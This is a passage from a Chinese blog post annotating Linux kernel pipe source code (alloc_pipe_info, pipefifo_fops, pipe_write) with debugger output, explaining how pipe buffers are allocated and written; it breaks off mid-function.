class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct pipe_inode_info *<span class="title">alloc_pipe_info</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pipe_bufs = PIPE_DEF_BUFFERS;<span class="comment">// 0x10</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> =</span> <span class="built_in">get_current_user</span>();<span class="comment">// 这里的user相当于生成的管道的句柄（接口），包括被多少个进程，引用计数，用户有多少挂起的信号，拥有的watches数量等等。</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_bufs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> max_size = <span class="built_in">READ_ONCE</span>(pipe_max_size);<span class="comment">// 这里是 max_size为0x100000，pipe_max_size也为0x100000</span></span><br><span class="line"></span><br><span class="line">pipe = <span class="built_in">kzalloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);<span class="comment">// 这里通过 kzalloc 为 pipe_inode_info 结构体对象生成一块堆空间</span></span><br><span class="line"><span class="keyword">if</span> (pipe == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> out_free_uid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pipe_bufs * PAGE_SIZE &gt; max_size &amp;&amp; !<span class="built_in">capable</span>(CAP_SYS_RESOURCE))<span class="comment">// 没进入这个if，# define PAGE_SIZE 4096，而0x10 * 0x1000 &lt; 0x100000</span></span><br><span class="line">pipe_bufs = max_size &gt;&gt; PAGE_SHIFT;<span class="comment">// # define PAGE_SHIFT 12</span></span><br><span class="line"></span><br><span class="line">user_bufs = <span class="built_in">account_pipe_buffers</span>(user, <span class="number">0</span>, pipe_bufs);<span class="comment">// 0x10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">too_many_pipe_buffers_soft</span>(user_bufs) &amp;&amp; <span class="built_in">pipe_is_unprivileged_user</span>()) &#123;<span class="comment">// 没进入该if</span></span><br><span class="line">user_bufs = <span class="built_in">account_pipe_buffers</span>(user, pipe_bufs, <span class="number">1</span>);</span><br><span class="line">pipe_bufs = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">too_many_pipe_buffers_hard</span>(user_bufs) &amp;&amp; <span class="built_in">pipe_is_unprivileged_user</span>())<span class="comment">// 也没有进入该if</span></span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line"></span><br><span class="line">pipe-&gt;bufs = <span class="built_in">kcalloc</span>(pipe_bufs, <span class="built_in"><span class="keyword">sizeof</span></span>(struct pipe_buffer),</span><br><span class="line">     GFP_KERNEL_ACCOUNT);<span class="comment">// 通过 kcalloc 给pipe_buffer分配堆内存。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;bufs) &#123;<span class="comment">// 为pip_inode_info结构体其他变量赋值</span></span><br><span class="line"><span class="built_in">init_waitqueue_head</span>(&amp;pipe-&gt;rd_wait);</span><br><span class="line"><span class="built_in">init_waitqueue_head</span>(&amp;pipe-&gt;wr_wait);</span><br><span class="line">pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="number">1</span>;</span><br><span class="line">pipe-&gt;max_usage = pipe_bufs;<span class="comment">// 0x10</span></span><br><span class="line">pipe-&gt;ring_size = pipe_bufs;<span class="comment">// 0x10</span></span><br><span class="line">pipe-&gt;nr_accounted = pipe_bufs;<span class="comment">// 0x10</span></span><br><span class="line">pipe-&gt;user = user;</span><br><span class="line"><span class="built_in">mutex_init</span>(&amp;pipe-&gt;mutex);</span><br><span class="line"><span class="keyword">return</span> pipe;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">out_revert_acct:</span><br><span class="line">(<span class="keyword">void</span>) <span class="built_in">account_pipe_buffers</span>(user, pipe_bufs, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">kfree</span>(pipe);</span><br><span class="line">out_free_uid:</span><br><span class="line"><span class="built_in">free_uid</span>(user);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">下面是该函数返回值，也就是pipe</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">gef➤  p *pipe</span></span><br><span class="line"><span class="comment">$5 = &#123;</span></span><br><span class="line"><span class="comment">  mutex = &#123;</span></span><br><span class="line"><span class="comment">    owner = &#123;</span></span><br><span class="line"><span class="comment">      counter = 0x0</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    wait_lock = &#123;</span></span><br><span class="line"><span class="comment">      &#123;</span></span><br><span class="line"><span class="comment">        rlock = &#123;</span></span><br><span class="line"><span class="comment">          raw_lock = &#123;</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">              val = &#123;</span></span><br><span class="line"><span class="comment">                counter = 0x0</span></span><br><span class="line"><span class="comment">              &#125;,</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                locked = 0x0,</span></span><br><span class="line"><span class="comment">                pending = 0x0</span></span><br><span class="line"><span class="comment">              &#125;,</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                locked_pending = 0x0,</span></span><br><span class="line"><span class="comment">                tail = 0x0</span></span><br><span class="line"><span class="comment">              &#125;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">          &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    osq = &#123;</span></span><br><span class="line"><span class="comment">      tail = &#123;</span></span><br><span class="line"><span class="comment">        counter = 0x0</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    wait_list = &#123;</span></span><br><span class="line"><span class="comment">      next = 0xffff888004f72e50,</span></span><br><span class="line"><span class="comment">      prev = 0xffff888004f72e50</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  rd_wait = &#123;</span></span><br><span class="line"><span class="comment">    lock = &#123;</span></span><br><span class="line"><span class="comment">      &#123;</span></span><br><span class="line"><span class="comment">        rlock = &#123;</span></span><br><span class="line"><span class="comment">          raw_lock = &#123;</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">              val = &#123;</span></span><br><span class="line"><span class="comment">                counter = 0x0</span></span><br><span class="line"><span class="comment">              &#125;,</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                locked = 0x0,</span></span><br><span class="line"><span class="comment">                pending = 0x0</span></span><br><span class="line"><span class="comment">              &#125;,</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                locked_pending = 0x0,</span></span><br><span class="line"><span class="comment">                tail = 0x0</span></span><br><span class="line"><span class="comment">              &#125;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">          &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    head = &#123;</span></span><br><span class="line"><span class="comment">      next = 0xffff888004f72e68,</span></span><br><span class="line"><span class="comment">      prev = 0xffff888004f72e68</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  wr_wait = &#123;</span></span><br><span class="line"><span class="comment">    lock = &#123;</span></span><br><span class="line"><span class="comment">      &#123;</span></span><br><span class="line"><span class="comment">        rlock = &#123;</span></span><br><span class="line"><span class="comment">          raw_lock = &#123;</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">              val = &#123;</span></span><br><span class="line"><span class="comment">                counter = 0x0</span></span><br><span class="line"><span class="comment">              &#125;,</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                locked = 0x0,</span></span><br><span class="line"><span class="comment">                pending = 0x0</span></span><br><span class="line"><span class="comment">              &#125;,</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                locked_pending = 0x0,</span></span><br><span class="line"><span class="comment">                tail = 0x0</span></span><br><span class="line"><span class="comment">              &#125;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">          &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    head = &#123;</span></span><br><span class="line"><span class="comment">      next = 0xffff888004f72e80,</span></span><br><span class="line"><span class="comment">      prev = 0xffff888004f72e80</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  head = 0x0,</span></span><br><span class="line"><span class="comment">  tail = 0x0,</span></span><br><span class="line"><span class="comment">  max_usage = 0x10,</span></span><br><span class="line"><span class="comment">  ring_size = 0x10,</span></span><br><span class="line"><span class="comment">  nr_accounted = 0x10,</span></span><br><span class="line"><span class="comment">  readers = 0x0,</span></span><br><span class="line"><span class="comment">  writers = 0x0,</span></span><br><span class="line"><span class="comment">  files = 0x0,</span></span><br><span class="line"><span class="comment">  r_counter = 0x1,</span></span><br><span class="line"><span class="comment">  w_counter = 0x1,</span></span><br><span class="line"><span class="comment">  tmp_page = 0x0 &lt;fixed_percpu_data&gt;,</span></span><br><span class="line"><span class="comment">  fasync_readers = 0x0 &lt;fixed_percpu_data&gt;,</span></span><br><span class="line"><span class="comment">  fasync_writers = 0x0 &lt;fixed_percpu_data&gt;,</span></span><br><span class="line"><span class="comment">  bufs = 0xffff888004364800,</span></span><br><span class="line"><span class="comment">  user = 0xffff888004396e80</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="9、struct-file-operations-pipefifo-fops"><a href="#9、struct-file-operations-pipefifo-fops" class="headerlink" title="9、struct file_operations pipefifo_fops"></a>9、struct file_operations pipefifo_fops</h4><p>上面第5节，<code>get_pipe_inode</code>函数将<code>inode-&gt;i_fop</code> 赋值为<code>&amp;pipefifo_fops</code>；作用是确定pipe的操作函数。比如<code>pipe_read</code>为读管道的操作，而<code>pipe_write</code>为写管道的操作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pipefifo_fops</span> =</span> &#123;</span><br><span class="line">.open= fifo_open,</span><br><span class="line">.llseek= no_llseek,</span><br><span class="line">.read_iter= pipe_read,</span><br><span class="line">.write_iter= pipe_write,</span><br><span class="line">.poll= pipe_poll,</span><br><span class="line">.unlocked_ioctl= pipe_ioctl,</span><br><span class="line">.release= pipe_release,</span><br><span class="line">.fasync= pipe_fasync,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>也可以通过调试的方式进行验证，我们在<code>pipe_write</code>函数下断点，运行在断点停止后查看函数调用栈。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  bt</span><br><span class="line"><span class="comment">#0  pipe_write (iocb=0xffffc9000036fe88, from=0xffffc9000036fe60) at fs/pipe.c:402</span></span><br><span class="line"><span class="comment">#1  0xffffffff811edfe1 in call_write_iter (iter=0xffffc9000036fe60, kio=0xffffc9000036fe88, file=0xffff88800415aa00) at ./include/linux/fs.h:1901</span></span><br><span class="line"><span class="comment">#2  new_sync_write (filp=filp@entry=0xffff88800415aa00, buf=buf@entry=0x559db68020e0 &quot;&quot;, len=len@entry=0x1000, ppos=ppos@entry=0x0 &lt;fixed_percpu_data&gt;) at fs/read_write.c:518</span></span><br><span class="line"><span class="comment">#3  0xffffffff811f06e3 in vfs_write (file=file@entry=0xffff88800415aa00, buf=buf@entry=0x559db68020e0 &quot;&quot;, count=count@entry=0x1000, pos=pos@entry=0x0 &lt;fixed_percpu_data&gt;) at fs/read_write.c:605</span></span><br><span class="line"><span class="comment">#4  0xffffffff811f0a92 in ksys_write (fd=&lt;optimized out&gt;, buf=0x559db68020e0 &quot;&quot;, count=0x1000) at fs/read_write.c:658</span></span><br><span class="line"><span class="comment">#5  0xffffffff81b9f553 in do_syscall_64 (nr=&lt;optimized out&gt;, regs=0xffffc9000036ff58) at arch/x86/entry/common.c:46</span></span><br><span class="line"><span class="comment">#6  0xffffffff81c0007c in entry_SYSCALL_64 () at arch/x86/entry/entry_64.S:120</span></span><br><span class="line"><span class="comment">#7  0x0000000000000000 in ?? ()</span></span><br></pre></td></tr></table></figure><p>我们知道kernel中对文件读写的函数为<code>vfs_read</code>和<code>vfs_write</code>。当满足一定条件时将会出现如下函数调用：<code>vfs_write</code>-&gt;<code>new_sync_write</code>-&gt;<code>call_write_iter</code>。观察<code>call_write_iter</code>函数实现。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">ssize_t</span> <span class="title">call_write_iter</span><span class="params">(struct file *file, struct kiocb *kio,</span></span></span><br><span class="line"><span class="params"><span class="function">      struct iov_iter *iter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> file-&gt;f_op-&gt;<span class="built_in">write_iter</span>(kio, iter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里根据<code>write_iter</code>来确定函数调用，由于在上面的结构体中已经为其赋值，所以当对管道进行写操作时，将会调用<code>pipe_write</code>函数。</p><h4 id="10、pipe-write"><a href="#10、pipe-write" class="headerlink" title="10、pipe_write"></a>10、pipe_write</h4><p>当写进程向管道中写入时，它利用标准的库函数write()，系统根据库函数传递的文件描述符，可找到该文件的 file 结构。<br>file 结构中指定了用来进行写操作的函数（即写入函数）地址，于是，内核调用该函数完成写操作。<br>写入函数在向内存中写入数据之前，必须首先检查 VFS 索引节点中的信息，同时满足如下条件时，才能进行实际的内存复制工作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">内存中有足够的空间可容纳所有要写入的数据；</span><br><span class="line">内存没有被读程序锁定。</span><br></pre></td></tr></table></figure><p>如果同时满足上述条件，写入函数首先锁定内存，然后从写进程的地址空间中复制数据到内存。<br>否则，写入进程就休眠在 VFS 索引节点的等待队列中，接下来，内核将调用调度程序，而调度程序会选择其他进程运行。<br>写入进程实际处于可中断的等待状态，当内存中有足够的空间可以容纳写入数据，<br>或内存被解锁时，读取进程会唤醒写入进程，这时，写入进程将接收到信号。<br>当数据写入内存之后，内存被解锁，而所有休眠在索引节点的读取进程会被唤醒。</p><p>管道的读取过程和写入过程类似。但是，进程可以在没有数据或内存被锁定时立即返回错误信息，而不是阻塞该进程，<br>这依赖于文件或管道的打开模式。反之，进程可以休眠在索引节点的等待队列中等待写入进程写入数据。<br>当所有的进程完成了管道操作之后，管道的索引节点被丢弃，而共享数据页也被释放</p><p>推荐看下linux0.12内核对管道的实现，实现的思想是类似的，也便于对代码的理解。笔者在下面也贴出了0.12代码对pipe_write的实现。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pipe_write</span>(struct kiocb *iocb, struct iov_iter *from)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;<span class="comment">// 调试打印该变量值，发现就是上面通过alloc_pipe_info函数生成的pipe</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> head;</span><br><span class="line"><span class="keyword">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> total_len = <span class="built_in">iov_iter_count</span>(from);</span><br><span class="line"><span class="keyword">ssize_t</span> chars;</span><br><span class="line"><span class="keyword">bool</span> was_empty = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">bool</span> wake_next_writer = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Null write succeeds. */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">unlikely</span>(total_len == <span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">__pipe_lock(pipe);<span class="comment">// 对pipe加互斥锁，保证单线程访问。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;readers) &#123;<span class="comment">// 这里要保证读取管道的任务不为0</span></span><br><span class="line"><span class="built_in">send_sig</span>(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line">ret = -EPIPE;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;watch_queue) &#123;</span><br><span class="line">ret = -EXDEV;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Only wake up if the pipe started out empty, since</span></span><br><span class="line"><span class="comment"> * otherwise there should be no readers waiting.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If it wasn&#x27;t empty we try to merge new data into</span></span><br><span class="line"><span class="comment"> * the last buffer.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * That naturally merges small writes, but it also</span></span><br><span class="line"><span class="comment"> * page-aligs the rest of the writes for large writes</span></span><br><span class="line"><span class="comment"> * spanning multiple pages.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 仅当管道开始为空时才唤醒，否则不应有读者在等待。</span></span><br><span class="line"><span class="comment">    * 如果它不为空，我们会尝试将新数据合并到最后一个缓冲区中。</span></span><br><span class="line"><span class="comment">    * 这自然会合并小型写入，但它也会为跨多个页面的大型写入对其余写入进行页面对齐。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">head = pipe-&gt;head;<span class="comment">// 0x0</span></span><br><span class="line">was_empty = <span class="built_in">pipe_empty</span>(head, pipe-&gt;tail);<span class="comment">// 判断管道头尾指针是否相等，如果相等则管道为空。</span></span><br><span class="line">chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);<span class="comment">// 0x38</span></span><br><span class="line"><span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;<span class="comment">// 0xf</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];<span class="comment">// pipe-&gt;bufs[0x10 &amp; 0xf]0x10 &amp; 0xf == 0</span></span><br><span class="line"><span class="keyword">int</span> offset = buf-&gt;offset + buf-&gt;len;<span class="comment">// 0x4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">    offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class="line">ret = <span class="built_in">pipe_buf_confirm</span>(pipe, buf);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">ret = <span class="built_in">copy_page_from_iter</span>(buf-&gt;page, offset, chars, from);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">unlikely</span>(ret &lt; chars)) &#123;</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf-&gt;len += ret;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">iov_iter_count</span>(from))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;readers) &#123;<span class="comment">// 如果pipe的读者数量为0，则发送信号，直到有读者。</span></span><br><span class="line"><span class="built_in">send_sig</span>(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EPIPE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">pipe_full</span>(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<span class="comment">// 如果pipe没有被填满</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;<span class="comment">// 0xf</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];<span class="comment">// 所有成员均为0</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pipe-&gt;tmp_page;<span class="comment">// 0x0</span></span><br><span class="line"><span class="keyword">int</span> copied;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!page) &#123;<span class="comment">// 如果缓存页为空，这里的作用是为pipe-&gt;tmp_page赋值为新分配的page</span></span><br><span class="line">page = <span class="built_in">alloc_page</span>(GFP_HIGHUSER | __GFP_ACCOUNT);<span class="comment">//调用 alloc_page 分配页，alloc_page 最终调用了 __alloc_pages_nodemask 函数从空闲列表中取出，或通过slowpath进行分配</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">unlikely</span>(!page)) &#123;</span><br><span class="line">ret = ret ? : -ENOMEM;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">pipe-&gt;tmp_page = page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocate a slot in the ring in advance and attach an</span></span><br><span class="line"><span class="comment"> * empty buffer.  If we fault or otherwise fail to use</span></span><br><span class="line"><span class="comment"> * it, either the reader will consume it or it&#x27;ll still</span></span><br><span class="line"><span class="comment"> * be there for the next write.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="built_in">spin_lock_irq</span>(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">pipe_full</span>(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line"><span class="built_in">spin_unlock_irq</span>(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = head + <span class="number">1</span>;</span><br><span class="line"><span 